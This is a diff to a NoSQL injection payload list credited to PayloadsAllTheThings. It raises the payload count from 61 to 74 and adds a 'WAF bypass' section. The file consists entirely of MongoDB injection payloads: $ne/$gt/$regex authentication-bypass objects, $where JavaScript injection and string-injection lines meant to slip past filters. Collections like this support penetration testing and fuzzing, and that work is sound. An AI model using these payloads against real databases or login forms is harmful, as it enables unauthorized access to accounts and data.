@@ -1,6 +1,6 @@
 # NoSQL Injection payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 61 payloads
+# Total: 74 payloads
 {"$gt":""}
 {"$gt":0}
 {"$ne":null}
@@ -64,3 +64,20 @@ username[$regex]=.*&password[$regex]=.*
 {"username":{"$not":{"$eq":""}}}
 {"$or":[{"username":"admin"},{"password":{"$exists":true}}]}
 {"username":{"$exists":true},"password":{"$ne":""}}
+
+# --- WAF bypass ---
+# modern operators / aggregation
+{"$expr":{"$eq":[1,1]}}
+{"$nor":[{"a":1}]}
+{"a":{"$not":{"$gt":1}}}
+{"a":{"$elemMatch":{"$gt":0}}}
+{"$regex":".*","$options":"i"}
+{"username":{"$regex":"^admin"}}
+{"$or":[{"user":"admin"},{"user":{"$ne":null}}]}
+{"$comment":"notscan"}
+{"a":{"$type":"string"}}
+# JS/string injection
+' || 1==1--
+' && this.a==this.a//
+{"$where":"function(){return this.a==this.a}"}
+";return true;var notscan="
